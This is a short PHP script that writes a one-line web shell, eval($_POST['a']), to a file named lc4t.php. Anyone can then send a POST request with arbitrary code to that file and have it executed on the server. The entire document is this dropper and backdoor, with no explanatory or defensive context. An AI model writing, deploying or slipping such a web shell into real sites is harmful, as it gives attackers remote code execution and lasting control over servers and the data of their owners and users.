<?php
$f = fopen('lc4t.php','w');
$v = "<?php eval(\$_POST['a']); ?>";
fwrite($f,$v);
fclose($f);
?>